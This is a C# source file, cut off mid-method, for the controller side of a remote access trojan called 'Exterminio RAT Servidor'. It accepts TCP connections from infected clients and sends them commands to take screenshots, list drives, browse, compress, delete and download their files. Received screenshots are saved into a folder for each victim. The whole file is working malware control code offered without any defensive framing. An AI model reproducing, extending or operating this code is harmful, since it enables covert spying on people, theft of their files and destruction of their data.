using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using System.IO;
using System.IO.Compression;
namespace Exterminio_RAT_Servidor
{
    public partial class Form1 : Form
    {
        private int PuertoEscucha;
        private IPAddress IPEscucha;
        private TcpListener Servidor;
        private List<TcpClient> ClientesConectados;
        private List<Thread> HilosClientes;
        private Dictionary<string, PaqueteInformacionReceptor> InformacionClientes;
        private Dictionary<string, TcpClient> ClienteMapping; // Mapeo de ID a TcpClient
        private Dictionary<string, Mutex> ClienteMutexes; // Mutex por cliente para capturas
        private Dictionary<string, Mutex> ClienteDiskMutexes; // Mutex por cliente para detección de discos
        private Dictionary<string, Mutex> ClienteAbrirDiscoMutexes; // Mutex por cliente para explorador de archivos
        private Dictionary<string, Mutex> ClienteCompresionMutexes; // Mutex por cliente para compresión

        private Thread Listening;
        private bool isServerRunning = false;
        
        // Variables para rastrear bytes enviados y recibidos
        private long totalBytesEnviados = 0;
        private long totalBytesRecibidos = 0;

        private ConfigExterminioServidor configForm;
        private ListaClientesConectados listaClientesForm;
        private GaleriaClientesFT galeriaClientesForm;
        private NotifyIcon notifyIcon;
        private CaptureHandler captureHandler;

        public Form1()
        {
            InitializeComponent();
            ClientesConectados = new List<TcpClient>();
            HilosClientes = new List<Thread>();
            InformacionClientes = new Dictionary<string, PaqueteInformacionReceptor>();
            ClienteMapping = new Dictionary<string, TcpClient>();
            ClienteMutexes = new Dictionary<string, Mutex>();
            ClienteDiskMutexes = new Dictionary<string, Mutex>();
            ClienteAbrirDiscoMutexes = new Dictionary<string, Mutex>();
            ClienteCompresionMutexes = new Dictionary<string, Mutex>();
            captureHandler = new CaptureHandler(this);
            InitializeNotifyIcon();
            
            // Configurar el cierre del formulario
            this.FormClosing += Form1_FormClosing;
            
            ShowConfigForm();
        }



        private void InitializeNotifyIcon()
        {
            try
            {
                // Crear el NotifyIcon
                notifyIcon = new NotifyIcon();
                notifyIcon.Icon = SystemIcons.Application; // Usar el icono de la aplicación
                notifyIcon.Text = "Exterminio RAT Servidor";
                notifyIcon.Visible = true;
                
                // Configurar el menú contextual del NotifyIcon
                ContextMenuStrip contextMenu = new ContextMenuStrip();
                contextMenu.Items.Add("Mostrar Servidor", null, (s, e) => this.Show());
                contextMenu.Items.Add("Ocultar Servidor", null, (s, e) => this.Hide());
                contextMenu.Items.Add("-"); // Separador
                contextMenu.Items.Add("Salir", null, (s, e) => SalirAplicacion());
                
                notifyIcon.ContextMenuStrip = contextMenu;
                
                // Evento de doble clic para mostrar el formulario
                notifyIcon.DoubleClick += (s, e) => this.Show();
                
                Console.WriteLine("NotifyIcon inicializado correctamente");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error inicializando NotifyIcon: {ex.Message}");
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                // Si el usuario está cerrando desde el botón X, preguntar confirmación
                if (e.CloseReason == CloseReason.UserClosing)
                {
                    Console.WriteLine("Usuario solicitando cierre del formulario...");
                    
                    // Mostrar notificación de cierre
                    ShowNotification("Cerrando Servidor", 
                        "Deteniendo servidor y cerrando aplicación...", 
                        ToolTipIcon.Info);
                    
                    // Detener el servidor de forma segura
                    StopServer();
                    
                    // No cancelar el cierre, permitir que continúe
                    e.Cancel = false;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error en Form1_FormClosing: {ex.Message}");
            }
        }

        public async Task SendCaptureCommand(string clientId)
        {
            try
            {
                // Buscar el cliente usando el mapeo
                TcpClient targetClient = null;
                lock (ClienteMapping)
                {
                    if (ClienteMapping.ContainsKey(clientId))
                    {
                        targetClient = ClienteMapping[clientId];
                    }
                }
                
                if (targetClient != null && targetClient.Connected)
                {
                    Console.WriteLine($"Enviando comando de captura al cliente {clientId}");
                    await captureHandler.HandleCaptureCommand(targetClient, clientId);
                }
                else
                {
                    Console.WriteLine($"Cliente {clientId} no encontrado o no conectado");
                    ShowNotification("Error de Captura", 
                        $"Cliente {clientId} no está conectado", 
                        ToolTipIcon.Error);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error enviando comando de captura: {ex.Message}");
                ShowNotification("Error de Captura", 
                    $"Error enviando comando de captura: {ex.Message}", 
                    ToolTipIcon.Error);
            }
        }

        public async Task SendDiskDetectionCommand(string clientId)
        {
            try
            {
                // Buscar el cliente usando el mapeo
                TcpClient targetClient = null;
                lock (ClienteMapping)
                {
                    if (ClienteMapping.ContainsKey(clientId))
                    {
                        targetClient = ClienteMapping[clientId];
                    }
                }
                
                if (targetClient != null && targetClient.Connected)
                {
                    Console.WriteLine($"Enviando comando de detección de discos al cliente {clientId}");
                    
                    // Obtener el stream del cliente
                    NetworkStream stream = targetClient.GetStream();
                    
                    // Enviar comando DISCOS
                    string command = "DISCOS";
                    byte[] commandBytes = Encoding.UTF8.GetBytes(command);
                    await stream.WriteAsync(commandBytes, 0, commandBytes.Length);
                    
                    // Actualizar contador de bytes enviados
                    ActualizarBytesEnviados(commandBytes.Length);
                    
                    Console.WriteLine($"Comando DISCOS enviado al cliente {clientId}");
                    ShowNotification("Comando Enviado", 
                        $"Comando de detección de discos enviado al cliente {clientId}", 
                        ToolTipIcon.Info);
                }
                else
                {
                    Console.WriteLine($"Cliente {clientId} no encontrado o no conectado");
                    ShowNotification("Error de Detección", 
                        $"Cliente {clientId} no está conectado", 
                        ToolTipIcon.Error);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error enviando comando de detección de discos: {ex.Message}");
                ShowNotification("Error de Detección", 
                    $"Error enviando comando de detección de discos: {ex.Message}", 
                    ToolTipIcon.Error);
            }
        }

        public async Task SendAbrirDiscoCommand(string clientId, string ruta)
        {
            try
            {
                // Buscar el cliente usando el mapeo
                TcpClient targetClient = null;
                lock (ClienteMapping)
                {
                    if (ClienteMapping.ContainsKey(clientId))
                    {
                        targetClient = ClienteMapping[clientId];
                    }
                }
                
                if (targetClient != null && targetClient.Connected)
                {
                    Console.WriteLine($"Enviando comando de explorador de archivos al cliente {clientId} para ruta: {ruta}");
                    
                    // Obtener el stream del cliente
                    NetworkStream stream = targetClient.GetStream();
                    
                    // Enviar comando ABRIRDISCO con la ruta
                    string command = $"ABRIRDISCO:{ruta}";
                    byte[] commandBytes = Encoding.UTF8.GetBytes(command);
                    await stream.WriteAsync(commandBytes, 0, commandBytes.Length);
                    
                    // Actualizar contador de bytes enviados
                    ActualizarBytesEnviados(commandBytes.Length);
                    
                    Console.WriteLine($"Comando ABRIRDISCO enviado al cliente {clientId}");
                    ShowNotification("Comando Enviado", 
                        $"Comando de explorador de archivos enviado al cliente {clientId} para ruta: {ruta}", 
                        ToolTipIcon.Info);
                }
                else
                {
                    Console.WriteLine($"Cliente {clientId} no encontrado o no conectado");
                    ShowNotification("Error de Explorador", 
                        $"Cliente {clientId} no está conectado", 
                        ToolTipIcon.Error);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error enviando comando de explorador de archivos: {ex.Message}");
                ShowNotification("Error de Explorador", 
                    $"Error enviando comando de explorador de archivos: {ex.Message}", 
                    ToolTipIcon.Error);
            }
        }

        public async Task SendComprimirCommand(string clientId, string ruta)
        {
            try
            {
                // Buscar el cliente usando el mapeo
                TcpClient targetClient = null;
                lock (ClienteMapping)
                {
                    if (ClienteMapping.ContainsKey(clientId))
                    {
                        targetClient = ClienteMapping[clientId];
                    }
                }
                
                if (targetClient != null && targetClient.Connected)
                {
                    Console.WriteLine($"🗜️ Enviando comando de compresión al cliente {clientId} para ruta: {ruta}");
                    
                    // Obtener el stream del cliente
                    NetworkStream stream = targetClient.GetStream();
                    
                    // Enviar comando COMPRIMIR con la ruta
                    string command = $"COMPRIMIR:{ruta}";
                    byte[] commandBytes = Encoding.UTF8.GetBytes(command);
                    await stream.WriteAsync(commandBytes, 0, commandBytes.Length);
                    
                    // Actualizar contador de bytes enviados
                    ActualizarBytesEnviados(commandBytes.Length);
                    
                    Console.WriteLine($"Comando COMPRIMIR enviado al cliente {clientId}");
                    ShowNotification("Compresión Iniciada", 
                        $"Comando de compresión enviado al cliente {clientId} para ruta: {ruta}", 
                        ToolTipIcon.Info);
                }
                else
                {
                    Console.WriteLine($"Cliente {clientId} no encontrado o no conectado");
                    ShowNotification("Error de Compresión", 
                        $"Cliente {clientId} no está conectado", 
                        ToolTipIcon.Error);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error enviando comando de compresión: {ex.Message}");
                ShowNotification("Error de Compresión", 
                    $"Error enviando comando de compresión: {ex.Message}", 
                    ToolTipIcon.Error);
            }
        }

        public async Task SendBorrarCommand(string clientId, string ruta)
        {
            try
            {
                // Buscar el cliente usando el mapeo
                TcpClient targetClient = null;
                lock (ClienteMapping)
                {
                    if (ClienteMapping.ContainsKey(clientId))
                    {
                        targetClient = ClienteMapping[clientId];
                    }
                }
                
                if (targetClient != null && targetClient.Connected)
                {
                    Console.WriteLine($"🗑️ Enviando comando de borrado al cliente {clientId} para ruta: {ruta}");
                    
                    // Obtener el stream del cliente
                    NetworkStream stream = targetClient.GetStream();
                    
                    // Enviar comando BORRAR con la ruta
                    string command = $"BORRAR:{ruta}";
                    byte[] commandBytes = Encoding.UTF8.GetBytes(command);
                    await stream.WriteAsync(commandBytes, 0, commandBytes.Length);
                    
                    // Actualizar contador de bytes enviados
                    ActualizarBytesEnviados(commandBytes.Length);
                    
                    Console.WriteLine($"Comando BORRAR enviado al cliente {clientId}");
                    ShowNotification("Borrado Iniciado", 
                        $"Comando de borrado enviado al cliente {clientId} para ruta: {ruta}", 
                        ToolTipIcon.Info);
                }
                else
                {
                    Console.WriteLine($"Cliente {clientId} no encontrado o no conectado");
                    ShowNotification("Error de Borrado", 
                        $"Cliente {clientId} no está conectado", 
                        ToolTipIcon.Error);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error enviando comando de borrado: {ex.Message}");
                ShowNotification("Error de Borrado", 
                    $"Error enviando comando de borrado: {ex.Message}", 
                    ToolTipIcon.Error);
            }
        }



        public async Task SendDescargarCommand(string clientId, string ruta)
        {
            try
            {
                // Buscar el cliente usando el mapeo
                TcpClient targetClient = null;
                lock (ClienteMapping)
                {
                    if (ClienteMapping.ContainsKey(clientId))
                    {
                        targetClient = ClienteMapping[clientId];
                    }
                }
                
                if (targetClient != null && targetClient.Connected)
                {
                    Console.WriteLine($"📥 Enviando comando DESCARGAR al cliente {clientId} para ruta: {ruta}");
                    
                    // Obtener el stream del cliente
                    NetworkStream stream = targetClient.GetStream();
                    
                    // Enviar comando DESCARGAR con la ruta
                    string command = $"DESCARGAR:{ruta}";
                    byte[] commandBytes = Encoding.UTF8.GetBytes(command);
                    await stream.WriteAsync(commandBytes, 0, commandBytes.Length);
                    
                    // Actualizar contador de bytes enviados
                    ActualizarBytesEnviados(commandBytes.Length);
                    
                    Console.WriteLine($"Comando DESCARGAR enviado al cliente {clientId}");
                    ShowNotification("Descarga Iniciada", 
                        $"Comando de descarga enviado al cliente {clientId} para ruta: {ruta}", 
                        ToolTipIcon.Info);
                }
                else
                {
                    Console.WriteLine($"Cliente {clientId} no encontrado o no conectado");
                    ShowNotification("Error de Descarga", 
                        $"Cliente {clientId} no está conectado", 
                        ToolTipIcon.Error);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error enviando comando DESCARGAR: {ex.Message}");
                ShowNotification("Error de Descarga", 
                    $"Error enviando comando de descarga: {ex.Message}", 
                    ToolTipIcon.Error);
            }
        }

        // Métodos para actualizar contadores de bytes
        public void ActualizarBytesEnviados(int bytes)
        {
            try
            {
                totalBytesEnviados += bytes;
                
                if (this.InvokeRequired)
                {
                    this.Invoke((MethodInvoker)delegate { ActualizarBytesEnviados(bytes); });
                    return;
                }
                
                string texto = $"📤 Bytes Enviados: {FormatearBytes(totalBytesEnviados)}";
                lblBytesEnviados.Text = texto;
                
                Console.WriteLine($"📤 Bytes enviados actualizados: {FormatearBytes(totalBytesEnviados)}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error actualizando bytes enviados: {ex.Message}");
            }
        }

        public void ActualizarBytesRecibidos(int bytes)
        {
            try
            {
                totalBytesRecibidos += bytes;
                
                if (this.InvokeRequired)
                {
                    this.Invoke((MethodInvoker)delegate { ActualizarBytesRecibidos(bytes); });
                    return;
                }
                
                string texto = $"📥 Bytes Recibidos: {FormatearBytes(totalBytesRecibidos)}";
                lblBytesRecibidos.Text = texto;
                
                Console.WriteLine($"📥 Bytes recibidos actualizados: {FormatearBytes(totalBytesRecibidos)}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error actualizando bytes recibidos: {ex.Message}");
            }
        }

        private string FormatearBytes(long bytes)
        {
            if (bytes == 0) return "0 B";
            
            string[] sufijos = { "B", "KB", "MB", "GB", "TB" };
            int contador = 0;
            double numero = bytes;
            
            while (numero >= 1024 && contador < sufijos.Length - 1)
            {
                numero /= 1024;
                contador++;
            }
            
            return $"{numero:0.##} {sufijos[contador]}";
        }

        private void ResetearContadoresBytes()
        {
            try
            {
                totalBytesEnviados = 0;
                totalBytesRecibidos = 0;
                
                if (this.InvokeRequired)
                {
                    this.Invoke((MethodInvoker)delegate { ResetearContadoresBytes(); });
                    return;
                }
                
                lblBytesEnviados.Text = "📤 Bytes Enviados: 0 B";
                lblBytesRecibidos.Text = "📥 Bytes Recibidos: 0 B";
                
                Console.WriteLine("🔄 Contadores de bytes reseteados");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reseteando contadores de bytes: {ex.Message}");
            }
        }

        private void SalirAplicacion()
        {
            try
            {
                Console.WriteLine("Solicitud de salida de aplicación...");
                
                // Detener el servidor de forma segura
                StopServer();
                
                // Mostrar notificación de salida
                ShowNotification("Cerrando Aplicación", 
                    "Cerrando Exterminio RAT Servidor...", 
                    ToolTipIcon.Info);
                
                // Esperar un momento para que se procese la notificación
                System.Threading.Thread.Sleep(500);
                
                // Cerrar la aplicación
                Application.Exit();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error al salir de la aplicación: {ex.Message}");
                Application.Exit();
            }
        }

        public void ShowNotification(string title, string message, ToolTipIcon icon = ToolTipIcon.Info)
        {
            try
            {
                if (notifyIcon != null && notifyIcon.Visible)
                {
                    notifyIcon.ShowBalloonTip(3000, title, message, icon);
                    Console.WriteLine($"Notificación mostrada: {title} - {message}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error mostrando notificación: {ex.Message}");
            }
        }

        private void ReproducirSonidoConexion()
        {
            try
            {
                // Obtener la ruta del directorio de la aplicación
                string rutaSonido = System.IO.Path.Combine(Application.StartupPath, "Sonidos", "ConexionRecibida.wav");
                
                // Verificar si el archivo existe
                if (System.IO.File.Exists(rutaSonido))
                {
                    // Reproducir el sonido de conexión recibida
                    using (SoundPlayer player = new SoundPlayer(rutaSonido))
                    {
                        player.Play();
                        Console.WriteLine($"Sonido reproducido: {rutaSonido}");
                    }
                }
                else
                {
                    Console.WriteLine($"Archivo de sonido no encontrado: {rutaSonido}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reproduciendo sonido: {ex.Message}");
            }
        }

        private void ShowConfigForm()
        {
            // Crear y mostrar el formulario de configuración
            configForm = new ConfigExterminioServidor();
            
            // Suscribirse a los eventos
            configForm.ServerConfigChanged += OnServerConfigChanged;
            configForm.ConfigurationApplied += OnConfigurationApplied;
            
            // Mostrar el formulario de configuración
            configForm.ShowDialog();
        }

        private void OnServerConfigChanged(object sender, ServerConfigEventArgs e)
        {
            if (e.IsStarting)
            {
                StartServer(e.IPAddress, e.Port);
            }
            else
            {
                StopServer();
            }
        }

        private void OnConfigurationApplied(object sender, EventArgs e)
        {
            // El formulario de configuración se cierra automáticamente
            // Ahora mostrar el formulario principal del servidor
            this.Show();
            this.WindowState = FormWindowState.Normal;
            
            // Mostrar notificación de confirmación
            ShowNotification("Configuración Exitosa", 
                "Configuración aplicada correctamente. El servidor está listo para recibir conexiones.", 
                ToolTipIcon.Info);
        }

        private void StartServer(string ipAddress, int port)
        {
            try
            {
                if (isServerRunning)
                {
                    StopServer();
                }

                // Verificar si el puerto está disponible
                if (!IsPortAvailable(ipAddress, port))
                {
                    ShowNotification("Error de Puerto", 
                        $"El puerto {port} no está disponible. Intente con otro puerto.", 
                        ToolTipIcon.Warning);
                    return;
                }

                // Resetear contadores de bytes al iniciar
                ResetearContadoresBytes();

                PuertoEscucha = port;
                IPEscucha = IPAddress.Parse(ipAddress);
                
                Servidor = new TcpListener(IPEscucha, PuertoEscucha);
                
                Listening = new Thread(StartListening);
                Listening.IsBackground = true; // Hilo en segundo plano
                
                Listening.Start();
                isServerRunning = true;
                
                // Resetear contadores de bytes
                ResetearContadoresBytes();
                
                                ShowNotification("Servidor Iniciado", 
                    $"Servidor iniciado en {ipAddress}:{port}", 
                    ToolTipIcon.Info);
            }
            catch (Exception ex)
            {
                                ShowNotification("Error del Servidor", 
                    $"Error al iniciar el servidor: {ex.Message}", 
                    ToolTipIcon.Error);
            }
        }

        private bool IsPortAvailable(string ipAddress, int port)
        {
            try
            {
                using (TcpClient testClient = new TcpClient())
                {
                    testClient.Connect(ipAddress, port);
                    testClient.Close();
                    return false; // Puerto en uso
                }
            }
            catch (SocketException)
            {
                return true; // Puerto disponible
            }
            catch (Exception)
            {
                return true; // Puerto disponible
            }
        }

        private void StopServer()
        {
            try
            {
               Console.WriteLine("Iniciando detención del servidor...");
                isServerRunning = false;
                
                // Detener servidor TCP inmediatamente
                if (Servidor != null)
                {
                    try
                    {
                       Console.WriteLine("Deteniendo servidor TCP...");
                        Servidor.Stop();
                        Servidor = null;
                       Console.WriteLine("Servidor TCP detenido");
                    }
                    catch (Exception ex)
                    {
                       Console.WriteLine($"Error deteniendo servidor TCP: {ex.Message}");
                    }
                }
                
                // Detener hilo de escucha con timeout
                if (Listening != null && Listening.IsAlive)
                {
                    try
                    {
                       Console.WriteLine("Deteniendo hilo de escucha...");
                        if (!Listening.Join(2000)) // 2 segundos máximo
                        {
                           Console.WriteLine("Hilo de escucha no respondió, forzando terminación...");
                            try
                            {
                                Listening.Abort();
                    }
                    catch (Exception ex)
                    {
                               Console.WriteLine($"Error forzando terminación del hilo: {ex.Message}");
                            }
                        }
                        Listening = null;
                       Console.WriteLine("Hilo de escucha detenido");
                    }
                    catch (Exception ex)
                    {
                       Console.WriteLine($"Error deteniendo hilo de escucha: {ex.Message}");
                    }
                }
                
                // Cerrar conexiones de clientes de forma asíncrona
                Task.Run(() =>
                {
                    try
                    {
                        lock (ClientesConectados)
                        {
                           Console.WriteLine($"Cerrando {ClientesConectados.Count} conexiones de clientes...");
                            foreach (var cliente in ClientesConectados.ToList())
                            {
                                try
                                {
                                    if (cliente.Connected)
                                    {
                                        cliente.Close();
                                    }
                                    cliente.Dispose();
                    }
                    catch (Exception ex)
                    {
                                   Console.WriteLine($"Error cerrando cliente: {ex.Message}");
                                }
                            }
                            ClientesConectados.Clear();
                           Console.WriteLine("Conexiones de clientes cerradas");
                        }
                    }
                    catch (Exception ex)
                    {
                       Console.WriteLine($"Error en cierre de clientes: {ex.Message}");
                    }
                });
                
                // Detener hilos de clientes de forma asíncrona
                Task.Run(() =>
                {
                    try
                    {
                        lock (HilosClientes)
                        {
                           Console.WriteLine($"Deteniendo {HilosClientes.Count} hilos de clientes...");
                            foreach (var hilo in HilosClientes.ToList())
                            {
                                try
                                {
                                    if (hilo.IsAlive)
                                    {
                                        if (!hilo.Join(1000)) // 1 segundo máximo
                                        {
                                           Console.WriteLine($"Hilo no respondió, forzando terminación...");
                                            try
                                            {
                                                hilo.Abort();
                    }
                    catch (Exception ex)
                    {
                                               Console.WriteLine($"Error forzando terminación del hilo: {ex.Message}");
                                            }
                                        }
                        }
                    }
                    catch (Exception ex)
                    {
                                   Console.WriteLine($"Error deteniendo hilo: {ex.Message}");
                                }
                            }
                            HilosClientes.Clear();
                           Console.WriteLine("Hilos de clientes detenidos");
                        }
                }
                catch (Exception ex)
                {
                       Console.WriteLine($"Error en cierre de hilos: {ex.Message}");
                    }
                });
                
                // Limpiar información de clientes
                lock (InformacionClientes)
                {
                    InformacionClientes.Clear();
                }
                
                // Limpiar Mutex de clientes
                lock (ClienteMutexes)
                {
                    foreach (var mutex in ClienteMutexes.Values)
                {
                    try
                    {
                            mutex?.Dispose();
                    }
                    catch (Exception ex)
                    {
                            Console.WriteLine($"Error limpiando Mutex de captura: {ex.Message}");
                        }
                    }
                    ClienteMutexes.Clear();
                }
                
                // Limpiar Mutex de detección de discos
                lock (ClienteDiskMutexes)
                {
                    foreach (var mutex in ClienteDiskMutexes.Values)
                    {
                        try
                        {
                            mutex?.Dispose();
                }
                catch (Exception ex)
                {
                            Console.WriteLine($"Error limpiando Mutex de detección de discos: {ex.Message}");
                        }
                    }
                    ClienteDiskMutexes.Clear();
                }
                
                // Limpiar Mutex de explorador de archivos
                lock (ClienteAbrirDiscoMutexes)
                {
                    foreach (var mutex in ClienteAbrirDiscoMutexes.Values)
                    {
                        try
                        {
                            mutex?.Dispose();
                }
                catch (Exception ex)
                {
                            Console.WriteLine($"Error limpiando Mutex de explorador de archivos: {ex.Message}");
                        }
                    }
                    ClienteAbrirDiscoMutexes.Clear();
                }
                
               Console.WriteLine("Detención del servidor completada");
                
                // Actualizar UI de forma segura
                if (!this.IsDisposed && !this.Disposing)
                {
                    this.Invoke((MethodInvoker)delegate
                    {
                        if (!this.IsDisposed && !this.Disposing)
                        {
                            ShowNotification("Servidor Detenido", 
                                "Servidor detenido correctamente", 
                                ToolTipIcon.Info);
                        }
                    });
                }
            }
            catch (Exception ex)
            {
               Console.WriteLine($"Error crítico deteniendo servidor: {ex.Message}");
                if (!this.IsDisposed && !this.Disposing)
                {
                    try
                    {
                        this.Invoke((MethodInvoker)delegate
                        {
                            if (!this.IsDisposed && !this.Disposing)
                            {
                                ShowNotification("Error del Servidor", 
                                    $"Error al detener el servidor: {ex.Message}", 
                                    ToolTipIcon.Error);
                            }
                        });
                    }
                    catch (Exception invokeEx)
                    {
                       Console.WriteLine($"Error en Invoke: {invokeEx.Message}");
                    }
                }
            }
        }

        private void StartListening()
        {
            try
            {
                Servidor.Start();
               Console.WriteLine($"Servidor escuchando en {IPEscucha}:{PuertoEscucha}");
                
                while (isServerRunning)
                {
                    try
                    {
                        TcpClient nuevoCliente = Servidor.AcceptTcpClient();
                       Console.WriteLine($"Cliente conectado desde: {((System.Net.IPEndPoint)nuevoCliente.Client.RemoteEndPoint).Address}");
                        
                        if (isServerRunning)
                        {
                            // Reproducir sonido de conexión cuando se conecta un cliente
                            this.Invoke((MethodInvoker)delegate
                            {
                                if (!this.IsDisposed && !this.Disposing)
                                {
                                    ReproducirSonidoConexion();
                                }
                            });
                            
                            // Agregar cliente a la lista
                            lock (ClientesConectados)
                            {
                                ClientesConectados.Add(nuevoCliente);
                            }
                            
                            // Crear hilo para manejar este cliente
                            Thread hiloCliente = new Thread(() => ManejarCliente(nuevoCliente));
                            hiloCliente.IsBackground = true;
                            
                            lock (HilosClientes)
                            {
                                HilosClientes.Add(hiloCliente);
                            }
                            
                            hiloCliente.Start();
                            
                           Console.WriteLine($"Cliente conectado desde {nuevoCliente.Client.RemoteEndPoint}");
                            
                            // Mostrar notificación de cliente conectado
                            ShowNotification("Cliente Conectado", 
                                $"Nuevo cliente conectado desde {nuevoCliente.Client.RemoteEndPoint}", 
                                ToolTipIcon.Info);
                        }
                    }
                    catch (ObjectDisposedException)
                    {
                        // Servidor cerrado, salir del bucle
                        break;
                    }
                    catch (InvalidOperationException)
                    {
                        // Servidor detenido
                        break;
                    }
                    catch (Exception ex)
                    {
                        if (isServerRunning)
                        {
                           Console.WriteLine($"Error aceptando cliente: {ex.Message}");
                        }
                    }
                }
            }
            catch (ObjectDisposedException)
            {
                // Servidor cerrado
               Console.WriteLine("Servidor cerrado");
            }
            catch (Exception ex)
            {
                if (isServerRunning && !this.IsDisposed && !this.Disposing)
                {
                    try
                    {
                        this.Invoke((MethodInvoker)delegate
                        {
                            if (!this.IsDisposed && !this.Disposing)
                            {
                                                ShowNotification("Error de Escucha", 
                    $"Error en la escucha: {ex.Message}", 
                    ToolTipIcon.Error);
                            }
                        });
                    }
                    catch { }
                }
            }
        }

        private void ProcesarRespuestaCaptura(string datosRecibidos, string clientId)
        {
            // Obtener o crear el Mutex para este cliente
            Mutex clientMutex = GetOrCreateClientMutex(clientId);
            
            try
            {
                Console.WriteLine($"Procesando respuesta de captura del cliente {clientId}");
                Console.WriteLine($"Longitud total de datos recibidos: {datosRecibidos.Length}");
                Console.WriteLine($"Datos recibidos (primeros 100 chars): {datosRecibidos.Substring(0, Math.Min(100, datosRecibidos.Length))}...");
                
                // Adquirir el Mutex para procesar la captura de forma segura
                if (clientMutex.WaitOne(5000)) // Esperar máximo 5 segundos
                {
                    try
                    {
                        Console.WriteLine($"Mutex adquirido para cliente {clientId}");
                        
                        // Verificar que empiece con "CAP:"
                        if (!datosRecibidos.StartsWith("CAP:"))
                        {
                            throw new Exception("Los datos no empiezan con 'CAP:'");
                        }
                        
                        // Extraer los datos Base64 después de "CAP:"
                        string base64Data = datosRecibidos.Substring(4);
                        Console.WriteLine($"Datos Base64 extraídos, longitud: {base64Data.Length}");
                        
                        // Verificar que sea Base64 válido
                        if (!EsBase64Valido(base64Data))
                        {
                            throw new Exception("Los datos no son Base64 válidos");
                        }
                        
                        // Decodificar Base64
                        byte[] compressedData = Convert.FromBase64String(base64Data);
                        Console.WriteLine($"Datos comprimidos recibidos: {compressedData.Length} bytes");
                        
                        // Descomprimir datos
                        byte[] imageData = DecompressData(compressedData);
                        Console.WriteLine($"Datos descomprimidos: {imageData.Length} bytes");
                        
                        // Decodificar Base64 de la imagen
                        string base64String = Encoding.UTF8.GetString(imageData);
                        Console.WriteLine($"String Base64 de imagen, longitud: {base64String.Length}");
                        
                        byte[] imageBytes = Convert.FromBase64String(base64String);
                        Console.WriteLine($"Imagen decodificada: {imageBytes.Length} bytes");
                        
                        // Guardar imagen en carpeta específica del cliente
                        string fileName = $"capture_{DateTime.Now:yyyyMMdd_HHmmss}.png";
                        string clientParentDirectory = Path.Combine(Application.StartupPath, clientId);
                        string capturesDirectory = Path.Combine(clientParentDirectory, "Captures");
                        
                        // Crear directorio padre del cliente si no existe
                        if (!Directory.Exists(clientParentDirectory))
                        {
                            Directory.CreateDirectory(clientParentDirectory);
                            Console.WriteLine($"Carpeta padre del cliente creada: {clientParentDirectory}");
                        }
                        
                        // Crear directorio Captures dentro del cliente si no existe
                        if (!Directory.Exists(capturesDirectory))
                        {
                            Directory.CreateDirectory(capturesDirectory);
                            Console.WriteLine($"Carpeta Captures del cliente creada: {capturesDirectory}");
                        }
                        
                        string filePath = Path.Combine(capturesDirectory, fileName);
                        File.WriteAllBytes(filePath, imageBytes);
                        
                        Console.WriteLine($"Captura guardada exitosamente: {filePath}");
                        
                        // Mostrar notificación de éxito
                        this.Invoke((MethodInvoker)delegate
                        {
                            if (!this.IsDisposed && !this.Disposing)
                            {
                                ShowNotification("Captura Completada", 
                                    $"Captura del cliente {clientId} guardada como {fileName}", 
                                    ToolTipIcon.Info);
                                
                                // Refrescar la galería si está visible
                                if (galeriaClientesForm != null && !galeriaClientesForm.IsDisposed && galeriaClientesForm.Visible)
                                {
                                    galeriaClientesForm.RefreshGallery();
                                }
                            }
                        });
                    }
                    finally
                    {
                        // Liberar el Mutex
                        clientMutex.ReleaseMutex();
                        Console.WriteLine($"Mutex liberado para cliente {clientId}");
                    }
                }
                else
                {
                    Console.WriteLine($"No se pudo adquirir el Mutex para cliente {clientId} - timeout");
                    ShowNotification("Error de Captura", 
                        $"Timeout al procesar captura del cliente {clientId}", 
                        ToolTipIcon.Warning);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error procesando respuesta de captura: {ex.Message}");
                Console.WriteLine($"StackTrace: {ex.StackTrace}");
                this.Invoke((MethodInvoker)delegate
                {
                    if (!this.IsDisposed && !this.Disposing)
                    {
                        ShowNotification("Error de Captura", 
                            $"Error procesando captura del cliente {clientId}: {ex.Message}", 
                            ToolTipIcon.Error);
                    }
                });
            }
        }

        private void ProcesarRespuestaAbrirDisco(string datosRecibidos, string clientId)
        {
            // Obtener o crear el Mutex de explorador de archivos para este cliente
            Mutex clientAbrirDiscoMutex = GetOrCreateClientAbrirDiscoMutex(clientId);
            
            try
            {
                Console.WriteLine($"Procesando respuesta de explorador de archivos del cliente {clientId}");
                Console.WriteLine($"Longitud total de datos recibidos: {datosRecibidos.Length}");
                Console.WriteLine($"Datos recibidos (primeros 100 chars): {datosRecibidos.Substring(0, Math.Min(100, datosRecibidos.Length))}...");
                
                // Adquirir el Mutex de explorador de archivos para procesar la información de forma segura
                if (clientAbrirDiscoMutex.WaitOne(5000)) // Esperar máximo 5 segundos
                {
                    try
                    {
                        Console.WriteLine($"Mutex de explorador de archivos adquirido para cliente {clientId}");
                        
                        // Procesar la información de archivos usando AbrirDiscoProcessor
                        Console.WriteLine($"🔄 Procesando datos con AbrirDiscoProcessor...");
                        string processedInfo = AbrirDiscoProcessor.ProcesarDatosAbrirDiscoRecibidos(datosRecibidos);
                        Console.WriteLine($"✅ Datos procesados: {processedInfo.Length} caracteres");
                        
                        if (!processedInfo.StartsWith("ERROR:"))
                        {
                            // Parsear la información de archivos
                            Console.WriteLine($"🔄 Parseando información de archivos...");
                            FileSystemEntry[] archivos = AbrirDiscoProcessor.ParsearInformacionArchivos(processedInfo);
